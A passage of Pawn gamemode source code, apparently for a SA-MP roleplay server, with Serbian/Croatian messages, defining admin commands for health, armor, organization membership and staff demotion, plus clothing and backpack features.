			if( i != IPI ) SMG_TogglePlayerControllable( i, true );
		}

	   	SendClientMessageToAllEx( 0xFF4500FF, "#UNFREEZEALL: {FFFFFF}%s je odledi%s sve igrace.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la") );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:sethp( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xGamemaster ] >= 2 || PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[ playerid ][ xSpecAdmin ] >= 1 )
	{
		new id, zivot;
		if( sscanf( params, "ui", id, zivot ) ) return SendUsageMessage( playerid, "/sethp [id] [hp]." );
		if( id == IPI ) return SendErrorMessage( playerid, "Taj igrac je offline!");
		if( PlayerInfo[ playerid ][ xAdmin ] < 5 && PlayerInfo[ id ][ xAdmin ] >= 5 ) return SendErrorMessage( playerid, "Ne mozete to direktoru i vlasniku!" );

		if( GetNearestGZone( id ) != -1 ) return SendErrorMessage( playerid, "Ne mozes to na zoni (ANTI-AA)!." );
		if( GetPlayerVirtualWorld( id ) != 0 ) return SendErrorMessage( playerid, "Ne mozes to u banci/zlatari (ANTI-AA)!." );
		SetPlayerHealth( id, zivot );
		SendInfoMessage( playerid, "Postavili ste igracu {FFFFFF}%s {4282C0}HP na {FFFFFF}(%d).", ImeIgraca( id ), zivot );
 
		DodajWarnRed("~b~(SETHP) %s ~w~je postavi%s ~b~%s ~w~HP na ~b~%d.", ImeIgraca(playerid), getPolForString(playerid, "o", "la"), ImeIgraca(id), zivot);
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:auninvite( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 5 || PlayerInfo[ playerid ][ xSkriptaRank ] == 4 )
	{
		new igrac;
		if( sscanf( params, "u", igrac ) ) return SendUsageMessage( playerid, "/auninvite [id]." );
		if( igrac == IPI ) return SendErrorMessage( playerid, "Taj igrac je offline!");
		if( PlayerInfo[ igrac ][ xClan ] == 0 ) return SendErrorMessage( playerid, "Taj igrac nije u organizaciji." );
        if( PlayerInfo[ igrac ][ xLider ] != 0 ) return SendErrorMessage( playerid, "Taj igrac je lider." );
		new OrgID = PlayerInfo[ igrac ][ xClan ], name[ MAX_PLAYER_NAME ];

  		format( name, sizeof( name ), "%s", ImeIgraca( igrac ) );
        if( org_info[ OrgID ][ oSuspended ] ) return SendErrorMessage( playerid, "Ova organizacija je zakljucana od strane vlasnika." );

		for( new i = 0; i < 52; i++ )
		{
			if( strcmp( name, org_members_info[ OrgID ][ i ][ o_m_Name ], true ) == 0 )
			{
			    strmid( org_members_info[ OrgID ][ i ][ o_m_Name ], "Niko", 0, strlen( "Niko" ), MAX_PLAYER_NAME );
			    org_members_info[ OrgID ][ i ][ o_m_sqlID ] = 0;
			    break;
			}
		}

        sql_org_member_delete( org_info[ OrgID ][ oID ], PlayerInfo[ igrac ][ xID ] );
        org_info[ OrgID ][ oUbacenihClanova ]--;

    	ResetPlayerWeapons( igrac );
		PlayerInfo[ igrac ][ xClan ] = 0; PlayerInfo[ igrac ][ xRank ] = 0; PlayerInfo[ igrac ][ xSpawn ] = SetRandomSpawn( igrac );
        PlayerInfo[ igrac ][ xOrgUgovor ] = 0;  PlayerInfo[ igrac ][ xSkin ] = SetSexSkin( igrac ); SMG_SetPlayerSkin( igrac, SetSexSkin( igrac ) );

        sql_user_update_org_variables( igrac );
	    SCMF( igrac, CRVENA, "#AUNINVITE: {FFFFFF}Izbacen si iz organizacije od Admina {FA5555}%s.", ImeIgraca( playerid ) );
	    SCMF( playerid, CRVENA, "#AUNINVITE: {FFFFFF}Izbacili ste igraca {FA5555}%s {FFFFFF}iz organizacije", ImeIgraca( igrac ) );
    }
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:smeniadmina( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 7 )
	{
        if( !IsPlayerAdmin( playerid ) ) return SendErrorMessage( playerid, "Moras biti rcon admin." );

		new imeigraca[ MAX_PLAYER_NAME ];
	    if( sscanf( params, "s[24]", imeigraca ) ) return SendUsageMessage( playerid, "/smeniadmina [Ime_Prezime]." );

        if( IsPlayerConnected( GetPlayerIdFromName( imeigraca ) ) )
		{
			SendErrorMessage( playerid, "Taj igrac je online tako da smeni ga online.");
			return 1;
		}

        new query[128];
		mysql_format( mSQL, query, sizeof(query), "SELECT `user_id` FROM `users` WHERE `p_name` = '%e' LIMIT 1", imeigraca );
		mysql_tquery( mSQL, query, "CheckPlayerOffRank", "iis", playerid, 1, imeigraca );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:smenispecadmina( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 6 || PlayerInfo[ playerid ][ xSkriptaRank ] == 6 )
	{
		new imeigraca[ MAX_PLAYER_NAME ];
	    if( sscanf( params, "s[24]", imeigraca ) ) return SendUsageMessage( playerid, "/smenispecadmina [Ime_Prezime]." );

        if( IsPlayerConnected( GetPlayerIdFromName( imeigraca ) ) )
		{
			SendErrorMessage( playerid, "Taj igrac je online tako da smeni ga online.");
			return 1;
		}

		new query[128];
		mysql_format( mSQL, query, sizeof(query), "SELECT `user_id` FROM `users` WHERE `p_name` = '%e' LIMIT 1", imeigraca );
		mysql_tquery( mSQL, query, "CheckPlayerOffRank", "iis", playerid, 3, imeigraca );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:smenigamemastera( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 7 || PlayerInfo[playerid][xSkriptaRank] == 7 )
	{
		new imeigraca[ MAX_PLAYER_NAME ];
	    if( sscanf( params, "s[24]", imeigraca ) ) return SendUsageMessage( playerid, "/smenigamemastera [Ime_Prezime]." );

        if( IsPlayerConnected( GetPlayerIdFromName( imeigraca ) ) )
		{
			SendErrorMessage( playerid, "Taj igrac je online tako da smeni ga online.");
			return 1;
		}

        new query[128];
		mysql_format( mSQL, query, sizeof(query), "SELECT `user_id` FROM `users` WHERE `p_name` = '%e' LIMIT 1", imeigraca );
		mysql_tquery( mSQL, query, "CheckPlayerOffRank", "iis", playerid, 2, imeigraca );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:smenivipa( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 7 )
	{
        if( !IsPlayerAdmin( playerid ) ) return SendErrorMessage( playerid, "Moras biti rcon admin." );

		new imeigraca[ MAX_PLAYER_NAME ];
	    if( sscanf( params, "s[24]", imeigraca ) ) return SendUsageMessage( playerid, "/smenivipa [Ime_Prezime]." );

        if( IsPlayerConnected( GetPlayerIdFromName( imeigraca ) ) )
		{
			SendErrorMessage( playerid, "Taj igrac je online tako da smeni ga online.");
			return 1;
		}

        new query[128];
		mysql_format( mSQL, query, sizeof(query), "SELECT `user_id` FROM `users` WHERE `p_name` = '%e' LIMIT 1", imeigraca );
		mysql_tquery( mSQL, query, "CheckPlayerOffRank", "iis", playerid, 4, imeigraca );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:smenipromotera( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 5 || PlayerInfo[playerid][xSkriptaRank] == 5 )
	{
		new imeigraca[ MAX_PLAYER_NAME ];
	    if( sscanf( params, "s[24]", imeigraca ) ) return SendUsageMessage( playerid, "/smenipromotera [Ime_Prezime]" );

        if( IsPlayerConnected( GetPlayerIdFromName( imeigraca ) ) )
		{
			SendErrorMessage( playerid, "Taj igrac je online tako da smeni ga online.");
			return 1;
		}

        new query[128];
		mysql_format( mSQL, query, sizeof(query), "SELECT `user_id` FROM `users` WHERE `p_name` = '%e' LIMIT 1", imeigraca );
		mysql_tquery( mSQL, query, "CheckPlayerOffRank", "iis", playerid, 5, imeigraca );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:smeniytera( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 7 || PlayerInfo[playerid][xYouTuber] == 2 )
	{
		new imeigraca[ MAX_PLAYER_NAME ];
	    if( sscanf( params, "s[24]", imeigraca ) ) return SendUsageMessage( playerid, "/smeniytera [Ime_Prezime]" );

        if( IsPlayerConnected( GetPlayerIdFromName( imeigraca ) ) )
		{
			SendErrorMessage( playerid, "Taj igrac je online tako da smeni ga online.");
			return 1;
		}

        new query[128];
		mysql_format( mSQL, query, sizeof(query), "SELECT `user_id` FROM `users` WHERE `p_name` = '%e' LIMIT 1", imeigraca );
		mysql_tquery( mSQL, query, "CheckPlayerOffRank", "iis", playerid, 6, imeigraca );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:ainvite( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 4 )
	{
		new igrac, OrgID;
	    if( sscanf( params, "iu", OrgID, igrac ) ) return SendUsageMessage( playerid, "/ainvite [org id] [id]." );
	 	if( igrac == IPI ) return SendErrorMessage( playerid, "Igrac nije online ili si ukucao pogresan ID!" );
	 	if( PlayerInfo[ igrac ][ xClan ] != 0 ) return SendErrorMessage( playerid, "Igrac je vec clan organizacije!" );
	 	if( PlayerInfo[ igrac ][ xLider ] != 0 ) return SendErrorMessage( playerid, "Igrac je vec clan organizacije!" );
		if( PlayerInfo[ igrac ][ xKazneniUgovor ] != 0 ) return SendErrorMessage( playerid, "Igrac ima kazneni ugovor napustanja organizacije!");
        if( OrgID < 1 || org_info[ OrgID ][ oID ] == 0 ) return SendErrorMessage( playerid, "Ta organizacija ne postoji u bazi podataka." );

        if( org_info[ OrgID ][ oSuspended ] ) return SendErrorMessage( playerid, "Ova organizacija je zakljucana od strane vlasnika." );

        if( org_info[ OrgID ][ oUbacenihClanova ] >= org_info[ OrgID ][ oMaxClanova ] ) return SendErrorMessage( playerid, "Ova organizacija vec ima maksimalnih %d clanova.", org_info[ OrgID ][ oMaxClanova ] );

		new slot_id = -1;
        for( new i = 0; i < 52; i++ )
		{
			if( strcmp( "Niko", org_members_info[ OrgID ][ i ][ o_m_Name ], true ) == 0 )
			{
				slot_id = i;
				break;
			}
		}
        if( slot_id == -1 ) return SendErrorMessage( playerid, "Ova organizacija ima maksimalni broj clanova!" );

        strmid( org_members_info[ OrgID ][ slot_id ][ o_m_Name ], ImeIgraca( igrac ), 0, strlen( ImeIgraca( igrac ) ), MAX_PLAYER_NAME  );
		org_members_info[ OrgID ][ slot_id ][ o_m_sqlID ] = PlayerInfo[ igrac ][ xID ];
		org_members_info[ OrgID ][ slot_id ][ o_m_type ] = 0;

        PlayerInfo[ igrac ][ xClan ] = OrgID;
		PlayerInfo[ igrac ][ xRank ] = 1;
		PlayerInfo[ igrac ][ xSpawn ] = SPAWN_BAZA;

        sql_org_member_inser( org_info[ OrgID ][ oID ], 0, igrac );
        org_info[ OrgID ][ oUbacenihClanova ]++;

		PlayerInfo[ igrac ][ xClan ] = OrgID; PlayerInfo[ igrac ][ xRank ] = 1; PlayerInfo[ igrac ][ xSpawn ] = SPAWN_BAZA;
        if( PlayerInfo[ igrac ][ xPol ] == 1 )
		{
			PlayerInfo[ igrac ][ xSkin ] = org_info[ OrgID ][ oSkin1 ]; SMG_SetPlayerSkin( igrac, org_info[ OrgID ][ oSkin1 ] );
		}
		else if( PlayerInfo[ igrac ][ xPol ] == 2 )
		{
			PlayerInfo[ igrac ][ xSkin ] = org_info[ OrgID ][ oZSkin1 ]; SMG_SetPlayerSkin( igrac, org_info[ OrgID ][ oZSkin1 ] );
		}

		PlayerInfo[ igrac ][ xOrgUgovor ] = 0;
		sql_user_update_org_variables( igrac );

	    SendInfoMessage( igrac, "Cestitamo, ubaceni ste od Admina u organizaciju {FFFFFF}%s.", getOrgName( OrgID ) );
	    SendInfoMessage( playerid, "Ubacili ste igraca {FFFFFF}%s {4282C0}u organizaciju {FFFFFF}%s.", ImeIgraca( igrac ), org_info[ OrgID ][ oName ] );
	}
	return 1;
}

CMD:smenilidera( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 5 || PlayerInfo[ playerid ][ xSkriptaRank ] == 4  )
	{
        new imeigraca[ 24 ], OrgID;
	    if( sscanf( params, "is[24]", OrgID, imeigraca ) ) return SendUsageMessage( playerid, "/smenilidera [org id] [Ime_Prezime]" );

        if( OrgID < 1 || org_info[ OrgID ][ oID ] == 0 ) return SendErrorMessage( playerid, "Ta organizacija ne postoji u bazi podataka." );
        if( IsPlayerConnected( GetPlayerIdFromName( imeigraca ) ) ) return SendErrorMessage( playerid, "Taj igrac je online tako da smeni ga online.");

		new query[128];
		mysql_format( mSQL, query, sizeof(query), "SELECT `user_id` FROM `users` WHERE `p_name` = '%e' LIMIT 1", imeigraca );
		mysql_tquery( mSQL, query, "CheckPlayerOffOrgKick", "iiis", 1, OrgID, playerid, imeigraca );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:allmembers( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 5 || PlayerInfo[ playerid ][ xSkriptaRank ] == 4  )
	{
		new OrgID;
        if( sscanf( params, "i", OrgID ) ) return SendUsageMessage( playerid, "/allmembers [org id]" );
        if( OrgID < 1 || org_info[ OrgID ][ oID ] == 0 ) return SendErrorMessage( playerid, "Ta organizacija ne postoji u bazi podataka." );

        strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
		new l_or_m[ 10 ], l_c = 0, m_c = 0;

		for( new i = 0; i < org_info[ OrgID ][ oMaxClanova ]+2; i++ )
		{
            if( strcmp( "Niko", org_members_info[ OrgID ][ i ][ o_m_Name ], true ) != 0 )
			{
  				if( org_members_info[ OrgID ][ i ][ o_m_type ] == 1 )
				{
					l_or_m = "Lider"; l_c++;
					format( DialogStrgEx, sizeof( DialogStrgEx ), "%s%s %d: %s\n", DialogStrgEx, l_or_m, l_c, org_members_info[ OrgID ][ i ][ o_m_Name ] );
				}
            	else
				{
					l_or_m = "Clan"; m_c++;
					format( DialogStrgEx, sizeof( DialogStrgEx ), "%s%s %d: %s\n", DialogStrgEx, l_or_m, m_c, org_members_info[ OrgID ][ i ][ o_m_Name ] );
				}
			}
		}

		ShowPlayerDialog( playerid, 0, DIALOG_STYLE_MSGBOX, D_NASLOV, DialogStrgEx, "U redu", "" );
		strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
    }
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:aoffuninvite( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 5 || PlayerInfo[ playerid ][ xSkriptaRank ] == 4 )
	{
		new imeigraca[ 24 ], OrgID;
	    if( sscanf( params, "ds[24]", OrgID, imeigraca ) ) return SendUsageMessage( playerid, "/aoffuninvite [org id] [Ime_Prezime]" );

        if( OrgID < 1 || org_info[ OrgID ][ oID ] == 0 ) return SendErrorMessage( playerid, "Ta organizacija ne postoji u bazi podataka." );
        if( IsPlayerConnected( GetPlayerIdFromName( imeigraca ) ) )
		{
			SendErrorMessage( playerid, "Taj igrac je online tako da skini ga online.");
			return 1;
		}
		new query[128];
		mysql_format( mSQL, query, sizeof(query), "SELECT `user_id` FROM `users` WHERE `p_name` = '%e' LIMIT 1", imeigraca );
		mysql_tquery( mSQL, query, "CheckPlayerOffOrgKick", "iiis", 0, OrgID, playerid, imeigraca );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:setarmor( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 3 )
	{
		new id, zivot;
		if( sscanf( params, "ui", id, zivot ) ) return SendUsageMessage( playerid, "/setarmor [id] [armour]" );
		if( id == IPI ) return SendErrorMessage( playerid, "Taj igrac je offline.");
		if( PlayerInfo[ playerid ][ xAdmin ] < 5 && PlayerInfo[ id ][ xAdmin ] >= 5 ) return SendErrorMessage( playerid, "Ne mozete to direktorima i vlasnicima!" );

		if( GetNearestGZone( id ) != -1 ) return SendErrorMessage( playerid, "Ne mozes to na zoni (ANTI-AA)!." );
		if( GetPlayerVirtualWorld( id ) != 0 ) return SendErrorMessage( playerid, "Ne mozes to u banci/zlatari (ANTI-AA)!." );

		SetPlayerArmour( id, zivot);

		SendInfoMessage( playerid, "Postavili ste igracu {FFFFFF}%s {4282C0}armor na {FFFFFF}(%d).", ImeIgraca( id ), zivot );
 
	   	DodajWarnRed("~b~(SETARMOR) %s ~w~je postavi%s armor ~b~%d ~w~igracu ~b~%s.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), zivot, ImeIgraca( id ) );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:altchat(playerid)
{
	if( PlayerInfo[ playerid ][ xAdmin ] < 1 && PlayerInfo[ playerid ][ xSpecAdmin ] < 1 ) return SendErrorMessage(playerid, "Niste ovlasceni.");
	if( ALTPoruke[ playerid ] )
	{
		for (new i = 0; i < MAX_LINES; i ++)
		{
			strmid(AltChatTD_Text[playerid][i], " ", 0, 1);
		}
		for (new i = 0; i < MAX_LINES; i ++) 
		{
			PlayerTextDrawSetString(playerid, AltChatTD_Player[i], AltChatTD_Text[playerid][i]);
			PlayerTextDrawShow(playerid,AltChatTD_Player[i]);
		}
		ALTPoruke[ playerid ] = false;
		SendInfoMessage(playerid, "Ugasili ste alternativni cet!");
	}
	else if( !ALTPoruke[ playerid ] )
	{
		ALTPoruke[ playerid ] = true;
		SendInfoMessage(playerid, "Upalili ste alternativni cet!");
	}
	return 1;
}

CMD:cc(playerid)
{
	if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[ playerid ][ xSpecAdmin ] >= 1 )
	{
		if( gettime() < ServerInfo[ TClearChat ] ) return SendErrorMessage( playerid, "Chat mozes brisati svakih 5 sekundi." );
		ServerInfo[TClearChat] = gettime()+5;

		for(new j; j < 96; j++) SendClientMessageToAll(-1, " ");

		SendClientMessageToAll(0xFFFFFFFF, "** CC | Chat ociscen od strane Administratora.");
		SendClientMessageToAll(0x4282C0FF, "== "SERVER_WEB" ==");
 
		AdminMsg( ADM_WARN, "[ADMIN] %s je ocisti%s chat.", ImeIgraca(playerid), PlayerInfo[playerid][xPol] == 1 ? "o" : "la" );
	}
	else return SendErrorMessage( playerid, "Niste ovlasteni za koriscenje ove komande!");
	return 1;
}

CMD:odeca( playerid )
{
    if( IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Ne mozes dok si u vozilu." );

    ClothesSlots[ playerid ][ 0 ] = clothes_info[ playerid ][ x_slot_1_model ];
    ClothesSlots[ playerid ][ 1 ] = clothes_info[ playerid ][ x_slot_2_model ];
    ClothesSlots[ playerid ][ 2 ] = clothes_info[ playerid ][ x_slot_3_model ];
    ClothesSlots[ playerid ][ 3 ] = clothes_info[ playerid ][ x_slot_4_model ];

	if( ClothesSlots[ playerid ][ 0 ] == -1 && ClothesSlots[ playerid ][ 1 ] == -1 && ClothesSlots[ playerid ][ 2 ] == -1 && ClothesSlots[ playerid ][ 3 ] == -1 ) return SendErrorMessage( playerid, "Nemate nista od garderobe." );

	new str[200];
	format(str, sizeof(str),
								"{4282C0}(1). {FFFFFF}%s\n\
								{4282C0}(2). {FFFFFF}%s\n\
								{4282C0}(3). {FFFFFF}%s\n\
								{4282C0}(4). {FFFFFF}%s",
															getPlayerClothesName(playerid, 1), 
															getPlayerClothesName(playerid, 2), 
															getPlayerClothesName(playerid, 3), 
															getPlayerClothesName(playerid, 4));

	ShowPlayerDialog(playerid, dialog_CLOTHES, DIALOG_STYLE_LIST, "{FFFFFF}Odeca:", str, "Potvrdi", "Zatvori");
	return 1;
}
getPlayerClothesName(playerid, id)
{
    new odjeca[30] = "Prazno";

    switch(id)
    {
        case 1:
        {
            switch(clothes_info[ playerid ][ x_slot_1_model ])
            {
                case 0: odjeca = "Prazno";
                case 19006 .. 19035: odjeca = "Glasses";
                case 18912 .. 18920: odjeca = "Face Bandanas";
                case 18891 .. 18910, 11704, 19137: odjeca = "Bandanas and Masks";
                case 18939 .. 18943, 19065, 19330, 19331, 19554, 19558: odjeca = "Caps";
                case 19067 .. 19069, 18926 .. 18935, 19093, 19160, 18944..18951, 19352, 19487, 19488, 19528, 19553, 18967: odjeca = "Hats";
                case 19142, 19515: odjeca = "Armour";
                case 19520, 19521, 19099, 19161: odjeca = "Hat/Cap";
                case 19141, 19200: odjeca = "Helmet";
                case 19904: odjeca = "Vest";
                case 19942: odjeca = "Radio";
                case 18637: odjeca = "RIOT Shield";
            }
        }
        case 2:
        {
            switch(clothes_info[ playerid ][ x_slot_2_model ])
            {
                case 0: odjeca = "Prazno";
                case 19006 .. 19035: odjeca = "Glasses";
                case 18912 .. 18920: odjeca = "Face Bandanas";
                case 18891 .. 18910, 11704, 19137: odjeca = "Bandanas and Masks";
                case 18939 .. 18943, 19065, 19330, 19331, 19554, 19558: odjeca = "Caps";
                case 19067 .. 19069, 18926 .. 18935, 19093, 19160, 18944 .. 18951, 19352, 19487, 19488, 19528, 19553, 18967: odjeca = "Hats";
                case 19142, 19515: odjeca = "Armour";
                case 19520, 19521, 19099, 19161: odjeca = "Hat/Cap";
                case 19141, 19200: odjeca = "Helmet";
                case 19904: odjeca = "Vest";
                case 19942: odjeca = "Radio";
                case 18637: odjeca = "RIOT Shield";
            }
        }
        case 3:
        {
            switch(clothes_info[ playerid ][ x_slot_3_model ])
            {
                case 0: odjeca = "Prazno";
                case 19006 .. 19035: odjeca = "Glasses";
                case 18912 .. 18920: odjeca = "Face Bandanas";
                case 18891 .. 18910, 11704, 19137: odjeca = "Bandanas and Masks";
                case 18939 .. 18943, 19065, 19330, 19331, 19554, 19558: odjeca = "Caps";
                case 19067 .. 19069, 18926 .. 18935, 19093, 19160, 18944 .. 18951, 19352, 19487, 19488, 19528, 19553, 18967: odjeca = "Hats";
                case 19142, 19515: odjeca = "Armour";
                case 19520, 19521, 19099, 19161: odjeca = "Hat/Cap";
                case 19141, 19200: odjeca = "Helmet";
                case 19904: odjeca = "Vest";
                case 19942: odjeca = "Radio";
                case 18637: odjeca = "RIOT Shield";
            }
        }
        case 4:
        {
            switch(clothes_info[ playerid ][ x_slot_4_model ])
            {
                case 0: odjeca = "Prazno";
                case 19006 .. 19035: odjeca = "Glasses";
                case 18912 .. 18920: odjeca = "Face Bandanas";
                case 18891 .. 18910, 11704, 19137: odjeca = "Bandanas and Masks";
                case 18939 .. 18943, 19065, 19330, 19331, 19554, 19558: odjeca = "Caps";
                case 19067 .. 19069, 18926 .. 18935, 19093, 19160, 18944 .. 18951, 19352, 19487, 19488, 19528, 19553, 18967: odjeca = "Hats";
                case 19142, 19515: odjeca = "Armour";
                case 19520, 19521, 19099, 19161: odjeca = "Hat/Cap";
                case 19141, 19200: odjeca = "Helmet";
                case 19904: odjeca = "Vest";
                case 19942: odjeca = "Radio";
                case 18637: odjeca = "RIOT Shield";
            }
        }
    }
	return odjeca;
}

CMD:torba( playerid )
{
    if( WARPInfo[ playerid ][ WARIgrac ] != -1 ) return SendErrorMessage( playerid, "Ne mozes ovo dok si u waru." );
    if( tdm_player_info[ playerid ][ tdm_Team ] != 0 ) return SendErrorMessage( playerid, "Ne mozes ovo dok si na tdm eventu." );
    if( NaDmEventu[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes ovo dok si na dmu." );
	if( PlayerInfo[ playerid ][ xZatvor ] != 0 ) return SendErrorMessage( playerid, "Ne mozes ovo dok si u zatvoru." );
    if( IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Ne mozes dok si u vozilu." );
    if( Spectate[playerid] != -1 ) return SendErrorMessage( playerid, "Ne mozes torbu dok specas.");
	if(PlayerInvited[playerid] == event_LIVE) return SendErrorMessage(playerid, "Ne mozete to dok ste na live eventu.");

	OpenBackpack( playerid );
	return 1;
}

CMD:ubaciutorbu( playerid, const params[] )
{
	if( Spectate[playerid] != -1 ) return SendErrorMessage( playerid, "Ne mozes torbu dok specas.");
	if(PlayerInvited[playerid] == event_LIVE) return SendErrorMessage(playerid, "Ne mozete to dok ste na live eventu.");

	new broj;
	if( sscanf(params, "d", broj ) )
	{
		SendUsageMessage( playerid, "/ubaciutorbu [broj predmeta]");
		SendClientMessage( playerid, -1, "[Broj predmeta]: 1. Laptop | 2. Oruzje");
		return 1;
	}
	if(broj < 1 || broj > 2) return SendErrorMessage(playerid, "Broj predmeta od 1 do 2.");

	switch(broj)
	{
		case 1:
		{
			if( !LaptopRuke[ playerid ] ) return SendErrorMessage( playerid, "Nemate laptop u rukama." );

			if( !PlayerInfo[playerid][xTorba_Laptop] )
			{
				SendInfoMessage( playerid, "Stavio si laptop u torbu." );
				LaptopRuke[ playerid ] = false;
				PlayerInfo[playerid][xTorba_Laptop] = true;
				sql_user_update_integer(playerid, "xTorba_Laptop", PlayerInfo[playerid][xTorba_Laptop]);

				if( IsPlayerAttachedObjectSlotUsed( playerid, OBJECT_SLOT_MAIN ) ) RemovePlayerAttachedObject( playerid, OBJECT_SLOT_MAIN );
			}
			else return SendErrorMessage( playerid, "Vec imate laptop u torbi." );
		}
		case 2:
		{
	 		if( PlayerInfo[ playerid ][ xSpawned ] == 0 ) return 1;

			new Float:H;
			GetPlayerHealth( playerid, H );
			if( H < 10.0 ) return SendErrorMessage( playerid, "Ne mozete ubaciti oruzje, ako imate manje od 10HP." );

			if( GetFactionType( playerid ) == ORG_TIP_VLADINA || GetFactionType( playerid ) == ORG_TIP_HITMAN )
			{
				SendErrorMessage( playerid, "Vasa vrsta orge nema razloga ubacivati oruzja!");
				return 1;
			}
	  		if( WARPInfo[ playerid ][ WARIgrac ] != -1 ) return SendErrorMessage( playerid, "Ne mozes ovo dok si u waru." );
	  		if( tdm_player_info[ playerid ][ tdm_Team ] != 0 ) return SendErrorMessage( playerid, "Ne mozes ovo dok si na tdm eventu." );
	    	if( NaDmEventu[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes ovo dok si na dmu." );
			if( IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Ne mozes dok si u vozilu." );
			if( PlayerInfo[playerid][xTorba_Oruzje][0] != 0 && PlayerInfo[playerid][xTorba_Oruzje][1] != 0 && PlayerInfo[playerid][xTorba_Oruzje][2] != 0 ) return SendErrorMessage( playerid, "Mozes imati samo 3 oruzja u inventoriju." );
	  		if( ForbiddenWeap( playerid ) ) return SendErrorMessage( playerid, "Ne mozes ubaciti zabranjena oruzja u torbu." );

			new gunid = GetWeapon( playerid );

			if( gunid >= 35 && gunid <= 40 )
			{
	  			SendErrorMessage( playerid, "Ne mozes u torbu ubaciti %s.", WeaponInfos[ gunid ][ wName ] );
		    	return 1;
			}

			if( gunid < 1 )
			{
	  			SendErrorMessage( playerid, "Nemas oruzje u ruci koje bi ubacio." );
			    return 1;
			}

			if(PlayerInfo[playerid][xTorba_Oruzje][0] == 0)
			{
			    PlayerInfo[playerid][xTorba_Oruzje][0] = gunid;
			    PlayerInfo[playerid][xTorba_OruzjeM][0] = GetPlayerAmmo( playerid );

				static q[150];
				mysql_format(mSQL, q, sizeof(q), "UPDATE `users` SET `xTorba_Oruzje_1` = '%d', `xTorba_OruzjeM_1` = '%d' WHERE `user_id` = '%d'", PlayerInfo[playerid][xTorba_Oruzje][0], PlayerInfo[playerid][xTorba_OruzjeM][0], PlayerInfo[playerid][xID]);
				mysql_tquery(mSQL, q);
			}
			else if(PlayerInfo[playerid][xTorba_Oruzje][1] == 0)
			{
			    PlayerInfo[playerid][xTorba_Oruzje][1] = gunid;
			    PlayerInfo[playerid][xTorba_OruzjeM][1] = GetPlayerAmmo( playerid );

				static q[150];
				mysql_format(mSQL, q, sizeof(q), "UPDATE `users` SET `xTorba_Oruzje_2` = '%d', `xTorba_OruzjeM_2` = '%d' WHERE `user_id` = '%d'", PlayerInfo[playerid][xTorba_Oruzje][1], PlayerInfo[playerid][xTorba_OruzjeM][1], PlayerInfo[playerid][xID]);
				mysql_tquery(mSQL, q);
			}
			else if(PlayerInfo[playerid][xTorba_Oruzje][2] == 0)
			{
			    PlayerInfo[playerid][xTorba_Oruzje][2] = gunid;
			    PlayerInfo[playerid][xTorba_OruzjeM][2] = GetPlayerAmmo( playerid );

				static q[150];
				mysql_format(mSQL, q, sizeof(q), "UPDATE `users` SET `xTorba_Oruzje_3` = '%d', `xTorba_OruzjeM_3` = '%d' WHERE `user_id` = '%d'", PlayerInfo[playerid][xTorba_Oruzje][2], PlayerInfo[playerid][xTorba_OruzjeM][2], PlayerInfo[playerid][xID]);
				mysql_tquery(mSQL, q);
			}
			else return SendErrorMessage(playerid, "Nemas mesta vise u torbi." );

			SendNearbyMessage(playerid, 20.0, 0xC2A2DAFF, "* %s ubacuje %s u torbu.", ImeIgraca( playerid ), WeapNames[ GetWeapon( playerid ) ] );
			RemovePlayerWeapon( playerid, GetWeapon( playerid ) );
			SendInfoMessage( playerid, "Uspesno ste spremili u torbu %s.", WeaponInfos[ gunid ][ wName ] );
		}
	}
	return 1;
}

CMD:givegun( playerid, const params[] )
{
	new playa, gun, ammo;
	if( sscanf( params, "uii", playa, gun, ammo ) )
	{
		SendUsageMessage( playerid, "/givegun [id] [weapon] [ammo]");
